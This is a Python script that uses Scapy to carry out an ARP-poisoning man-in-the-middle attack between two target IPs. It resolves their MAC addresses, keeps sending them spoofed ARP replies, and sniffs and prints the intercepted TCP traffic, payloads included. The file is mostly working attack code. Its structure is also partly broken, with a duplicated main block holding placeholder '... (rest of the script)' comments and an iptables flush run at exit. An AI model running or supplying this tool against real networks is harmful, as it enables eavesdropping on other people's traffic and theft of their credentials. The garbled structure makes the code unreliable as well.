from argparse import ArgumentParser
from os import geteuid
from subprocess import call
from sys import exit as sysexit
from scapy.all import *
import threading
import time
import netifaces as ni

from scapy.all import srp1, ARP, Ether

# Function to get MAC address given an IP address and network interface
def get_mac(ip, iface):
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    response = srp1(arp_request, timeout=2, iface=iface, verbose=False)
    if response:
        return response.hwsrc
    else:
        print(f"Failed to get MAC address for {ip}")
        return None

# Function to perform ARP poisoning
def arp_poison(target_ip, target_mac, gateway_ip, gateway_mac, iface):
    poison_target = ARP()
    poison_target.op = 2
    poison_target.psrc = gateway_ip
    poison_target.pdst = target_ip
    poison_target.hwdst = target_mac

    poison_gateway = ARP()
    poison_gateway.op = 2
    poison_gateway.psrc = target_ip
    poison_gateway.pdst = gateway_ip
    poison_gateway.hwdst = gateway_mac

    while True:
        send(poison_target, verbose=False, iface=iface)
        send(poison_gateway, verbose=False, iface=iface)
        time.sleep(2)

# Example TCP MITM class
class tcp_MITM:
    def __init__(self, interface):
        self.interface = interface

    def setup_MITM(self, packet):
        if IP in packet and TCP in packet:
            src_ip = packet[IP].src
            dst_ip = packet[IP].dst
            src_port = packet[TCP].sport
            dst_port = packet[TCP].dport

            print(f"Captured TCP packet:")
            print(f"Source: {src_ip}:{src_port} --> Destination: {dst_ip}:{dst_port}")
            print(f"Payload: {repr(packet[TCP].payload)}")
            print("\n")

        # Forward the packet as is
        send(packet, iface=self.interface, verbose=False)

if __name__ == "__main__":
    # ... (rest of the script)

    try:
        # ... (rest of the try block)

        tcp_MITM_instance = tcp_MITM(interface)
        sniff(iface=interface, prn=tcp_MITM_instance.setup_MITM)

    except Exception as e:
        print(f"An error occurred: {e}")

        # This function will be called for each packet captured by Scapy
        pass

if __name__ == "__main__":
    ap = ArgumentParser(description="MITM Attack on given IPs using Scapy")
    ap.add_argument("-i", "--interface", required=True, help="network interface to use")
    ap.add_argument("-t", "--targets", required=True, nargs=2, help="target's IP address")
    args = vars(ap.parse_args())

    if not geteuid() == 0:
        sysexit("sudo dummy")

    try:
        print("Starting...")
        A_IP = args['targets'][0]
        B_IP = args['targets'][1]
        interface = args['interface']
        A_MAC = get_mac(A_IP, interface)
        B_MAC = get_mac(B_IP, interface)
        self_MAC = get_if_hwaddr(interface)
        self_IP = ni.ifaddresses(interface)[ni.AF_INET][0]['addr']

        poison_thread = threading.Thread(target=arp_poison, args=(A_IP, A_MAC, B_IP, B_MAC, interface))
        poison_thread.daemon = True
        poison_thread.start()

        tcp_MITM_instance = tcp_MITM(interface)
        sn = sniff(iface=interface, prn=tcp_MITM_instance.setup_MITM)

    except IOError:
        sysexit("Interface doesn't exist")
    except KeyboardInterrupt:
        call(("iptables -t nat -F PREROUTING").split(' '))
        print("\nStopping...")
